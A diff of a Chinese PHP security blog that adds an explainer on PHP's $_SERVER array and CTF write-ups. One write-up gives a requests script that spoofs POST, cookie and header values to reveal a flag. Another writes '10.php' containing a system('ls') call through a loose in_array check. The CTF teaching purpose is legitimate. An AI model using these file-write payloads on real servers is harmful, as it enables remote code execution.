@@ -79,6 +79,10 @@
   <time class="dt-published" datetime="2025-04-29T02:54:03.000Z" itemprop="datePublished">2025-04-29</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -87,7 +91,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">SERVER数组</a>
+      <a class="p-name article-title" href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">$_SERVER 数组</a>
     </h1>
   
 
@@ -95,14 +99,164 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <p>PHP 的 <code>$_SERVER</code> 是一个<strong>预定义的超全局数组</strong>，它存储了服务器和当前请求的相关信息。这些信息包括请求头、脚本路径、客户端信息等，具体内容取决于服务器环境（如 Apache、Nginx）。</p>
+<p>可以将 <code>$_SERVER</code> 数组的元素按来源和用途分为以下几类：</p>
+<h4 id="1-服务器信息"><a href="#1-服务器信息" class="headerlink" title="1. 服务器信息"></a><strong>1. 服务器信息</strong></h4><p>这些值由 <strong>Web 服务器（如 Apache&#x2F;Nginx）</strong> 生成，描述服务器自身的配置和环境。</p>
+<table>
+<thead>
+<tr>
+<th align="center">元素名</th>
+<th align="center">来源说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>SERVER_SOFTWARE</code></td>
+<td align="center">服务器软件名称（如 <code>Apache/2.4.41</code> 或 <code>nginx/1.18.0</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>SERVER_NAME</code></td>
+<td align="center">服务器域名（基于虚拟主机配置）。</td>
+</tr>
+<tr>
+<td align="center"><code>SERVER_ADDR</code></td>
+<td align="center">服务器 IP 地址。</td>
+</tr>
+<tr>
+<td align="center"><code>SERVER_PORT</code></td>
+<td align="center">服务器监听的端口（如 <code>80</code> 或 <code>443</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>SERVER_PROTOCOL</code></td>
+<td align="center">HTTP 协议版本（如 <code>HTTP/1.1</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>DOCUMENT_ROOT</code></td>
+<td align="center">网站根目录的绝对路径（如 <code>/var/www/html</code>）。</td>
+</tr>
+</tbody></table>
+<h4 id="2-客户端请求信息"><a href="#2-客户端请求信息" class="headerlink" title="2. 客户端请求信息"></a><strong>2. 客户端请求信息</strong></h4><p>这些值由 <strong>客户端（浏览器&#x2F;设备）</strong> 发送的 HTTP 请求头提供，其中 <code>HTTP_*</code> 开头的字段（如 <code>HTTP_REFERER</code>、<code>HTTP_USER_AGENT</code>）<strong>均来自客户端请求头</strong>，也就是可以通过修改请求头自定义写入 <code>$_SERVER</code> 数组的元素。</p>
+<table>
+<thead>
+<tr>
+<th align="center">元素名</th>
+<th align="center">来源说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>REQUEST_METHOD</code></td>
+<td align="center">HTTP 请求方法（如 <code>GET</code>、<code>POST</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>HTTP_USER_AGENT</code></td>
+<td align="center">客户端浏览器和操作系统信息（如 <code>Mozilla/5.0... Chrome/120.0...</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>HTTP_REFERER</code></td>
+<td align="center">用户来源页面的 URL（可能为空或被篡改）。</td>
+</tr>
+<tr>
+<td align="center"><code>HTTP_ACCEPT_LANGUAGE</code></td>
+<td align="center">客户端接受的语言（如 <code>en-US,en;q=0.9</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>HTTP_X_FORWARDED_FOR</code></td>
+<td align="center">经过代理时的客户端原始 IP（需代理服务器支持，可能被伪造）。</td>
+</tr>
+</tbody></table>
+<p>例如，如果请求头中添加 <code>Flag: value</code> 字段， <code>$_SERVER</code> 数组中也会生成对应的元素 <code>$_SERVER[HTTP_FLAG]</code> 。注意添加了前缀 <code>HTTP_</code> 并全部大写。</p>
+<h4 id="3-脚本路径信息"><a href="#3-脚本路径信息" class="headerlink" title="3. 脚本路径信息"></a><strong>3. 脚本路径信息</strong></h4><p>由 <strong>Web 服务器</strong> 根据请求的 URL 和文件路径生成。</p>
+<table>
+<thead>
+<tr>
+<th align="center">元素名</th>
+<th align="center">来源说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>PHP_SELF</code></td>
+<td align="center">当前脚本的相对路径（如 <code>/index.php</code>）。<strong>易受 XSS 攻击</strong>，需转义输出！</td>
+</tr>
+<tr>
+<td align="center"><code>SCRIPT_FILENAME</code></td>
+<td align="center">当前脚本的绝对路径（如 <code>/var/www/index.php</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>SCRIPT_NAME</code></td>
+<td align="center">当前脚本的路径（与 <code>PHP_SELF</code> 类似，但更安全）。</td>
+</tr>
+<tr>
+<td align="center"><code>REQUEST_URI</code></td>
+<td align="center">请求的 URI（包含查询参数，如 <code>/page.php?id=1</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>QUERY_STRING</code></td>
+<td align="center">URL 中的查询字符串（如 <code>id=1&amp;name=test</code> ）。</td>
+</tr>
+</tbody></table>
+<h4 id="4-客户端网络信息"><a href="#4-客户端网络信息" class="headerlink" title="4. 客户端网络信息"></a><strong>4. 客户端网络信息</strong></h4><p>由 <strong>Web 服务器</strong> 从 TCP&#x2F;IP 连接中获取，部分可能被代理影响。</p>
+<table>
+<thead>
+<tr>
+<th align="center">元素名</th>
+<th align="center">来源说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>REMOTE_ADDR</code></td>
+<td align="center">客户端 IP 地址（直接连接的 IP，代理场景下可能是代理服务器 IP）。</td>
+</tr>
+<tr>
+<td align="center"><code>REMOTE_PORT</code></td>
+<td align="center">客户端使用的端口号。</td>
+</tr>
+</tbody></table>
+<h4 id="5-HTTPS-和安全相关"><a href="#5-HTTPS-和安全相关" class="headerlink" title="5. HTTPS 和安全相关"></a><strong>5. HTTPS 和安全相关</strong></h4><p>由 <strong>Web 服务器</strong> 根据连接协议生成。</p>
+<table>
+<thead>
+<tr>
+<th align="center">元素名</th>
+<th align="center">来源说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>HTTPS</code></td>
+<td align="center">如果通过 HTTPS 访问，值为 <code>on</code>，否则为空。</td>
+</tr>
+<tr>
+<td align="center"><code>REQUEST_SCHEME</code></td>
+<td align="center">请求的协议（如 <code>http</code> 或 <code>https</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>SERVER_PORT_SECURE</code></td>
+<td align="center">如果使用 HTTPS，值为 <code>1</code>，否则为空（部分服务器支持）。</td>
+</tr>
+</tbody></table>
+<h4 id="6-其他特殊字段"><a href="#6-其他特殊字段" class="headerlink" title="6. 其他特殊字段"></a><strong>6. 其他特殊字段</strong></h4><table>
+<thead>
+<tr>
+<th align="center">元素名</th>
+<th align="center">来源说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>GATEWAY_INTERFACE</code></td>
+<td align="center">服务器使用的 CGI 版本（如 <code>CGI/1.1</code>）。</td>
+</tr>
+<tr>
+<td align="center"><code>PATH_TRANSLATED</code></td>
+<td align="center">服务器将路径映射到文件系统的结果（部分服务器支持）。</td>
+</tr>
+</tbody></table>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/29/SERVER%E6%95%B0%E7%BB%84/" data-id="cma228zyp000cxguhdmj5eaas" data-title="SERVER数组" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/29/SERVER%E6%95%B0%E7%BB%84/" data-id="cma2cz9xc000bicuh53yqgdtq" data-title="$_SERVER 数组" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>
+
     </footer>
   </div>
   
@@ -231,14 +385,29 @@
 <h2 id="题目六"><a href="#题目六" class="headerlink" title="题目六"></a>题目六</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>解题思路</strong></p>
-<p>Python 脚本解法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>本题有四个三元运算符：</p>
+<p>第一个判断是否定义了 <code>$_GET</code> 数组，若定义了，用 <code>$_POST</code> 数组给 <code>$_GET</code> 数组<strong>引用赋值</strong>（ <code>=&amp;</code> ）；若未定义，返回字符串 <code>flag</code> （不会返回到哪里去，后面也是）。</p>
+<p>引用赋值 <code>=&amp;</code> ，类似指针，让 <code>$_GET</code> 和 <code>$_POST</code> 指向同一个数据，之后对 <code>$_GET</code> 的操作会直接影响 <code>$_POST</code>，反之亦然。</p>
+<p>第二个判断 <code>$_GET</code> 数组里的 <code>$_GET[&#39;flag&#39;]</code> 元素的值是否等于 <code>flag</code> ，结合前面的引用赋值，就是判断 <code>$_POST[flag]</code> 元素的值是否等于 <code>flag</code> 。如果等于，则用 <code>$_COOKIE</code> 数组给 <code>$_GET</code> 数组引用赋值。</p>
+<p>第三个与第二个同理，不过最后会用 <code>$_SERVER</code> 数组给 <code>$_GET</code> 数组引用赋值。</p>
+<p>第四个判断 <code>$_SERVER</code> 数组中的 <code>$_SERVER[&#39;HTTP_FLAG&#39;]</code> 元素的值是否等于 <code>flag</code> 。如果等于则会将 <code>$flag</code> 变量作为文件名语法高亮（其实就是找不到该文件时会报错，把 <code>$flag</code> 变量的值回显在前端）。</p>
+<p>所以构造 URL 、请求体、 Cookie 与请求头字段即可得到 flag 。</p>
+<p><strong>Python 脚本解法</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;目标URL&quot;</span></span><br><span class="line">params = &#123; <span class="string">&quot;a&quot;</span>: <span class="string">&quot;1&quot;</span> &#125;  <span class="comment"># URL 传参</span></span><br><span class="line">data = &#123; <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># POST 数据</span></span><br><span class="line">cookies = &#123; <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># Cookie</span></span><br><span class="line">headers = &#123; <span class="string">&quot;FLAG&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># 设置 HTTP 头</span></span><br><span class="line"></span><br><span class="line">response = requests.post( url, params=params, headers=headers, cookies=cookies, data=data )</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
 
+<p><strong><code>headers = &#123; &quot;FLAG&quot;: &quot;flag&quot; &#125;</code> 的键名为什么不是 <code>HTTP_FLAG</code> 而是 <code>FLAG</code></strong> ：PHP 会把请求头的所有字段转化为大写并加上前缀 <code>HTTP_</code> 再写入 <code>$_SERVER</code> 数组，每个字段都对应一个元素。<code>$_SERVER</code> 数组的详细介绍可查看我写的关于 <code>$_SERVER</code> 数组的介绍。</p>
+<h2 id="题目七"><a href="#题目七" class="headerlink" title="题目七"></a>题目七</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随机生成 1 到 0x36d 也就是 877 的数字，并添加到 <code>$allow[]</code> 数组中。随后比对数组元素 <code>$_GET[&#39;n&#39;]</code> 的值是否在数组 <code>$allow[]</code> 中，并以 <code>$_GET[&#39;n&#39;]</code> 的值为文件名，将 <code>$_POST[&#39;content&#39;]</code> 写入文件。</p>
+<p>此处的 <code>in_array()</code> 不是严格模式，会转换，根据 PHP 特性，开头为数字的字符串被转化为数字时，后面的字符串会被去掉，所以可以构造 Payload ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;&quot;n&quot;:&quot;10.php&quot;&#125;  # 那么多次随机数总该生成 10 吧</span><br><span class="line">data = &#123;&quot;content&quot;:&quot;&lt;?php system(&#x27;ls&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过文件名 <code>10.php</code> 来使该文件被访问时会被当成 PHP 文件处理，从而执行恶意代码。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" data-id="cma228zym0006xguheb4f8m11" data-title="PHP 特性题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" data-id="cma2cz9xa0006icuhhtl8a9el" data-title="PHP 特性题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -296,7 +465,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" data-id="cma228zyw001gxguh3wrt5kxm" data-title="利用或运算活字印刷" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" data-id="cma2cz9xk001jicuhhzt5hk6h" data-title="利用或运算活字印刷" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -353,7 +522,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cma228zyk0003xguh1p10grdo" data-title="$_GET 与 $_POST 数组相关知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cma2cz9x50001icuh3gav746l" data-title="$_GET 与 $_POST 数组相关知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -436,7 +605,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cma228zyt000vxguhb52j9swf" data-title="filter 伪协议绕过 die（Web87）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cma2cz9xg000vicuh0w501ym0" data-title="filter 伪协议绕过 die（Web87）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -499,7 +668,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cma228zz0002axguh7u19hjjm" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cma2cz9xo002eicuhhi3p7f4b" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -839,7 +1008,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cma228zyo000bxguhho4e5mqp" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cma2cz9xb0008icuh3iq36b4y" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -924,7 +1093,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cma228zyn0008xguhdrj6adnj" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cma2cz9xd000cicuh0di2ahgo" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -1060,7 +1229,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cma228zyq000gxguh5xcm1nbl" data-title="Session" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cma2cz9xe000hicuhbme79bxp" data-title="Session" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -1163,7 +1332,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cma228zz1002ixguh4k7f55lr" data-title="条件竞争漏洞与 Session 的文件上传进度追踪功能" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cma2cz9xp002micuhhs2kgws4" data-title="条件竞争漏洞与 Session 的文件上传进度追踪功能" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -1234,7 +1403,7 @@
       <ul>
         
           <li>
-            <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">SERVER数组</a>
+            <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">$_SERVER 数组</a>
           </li>
         
           <li>
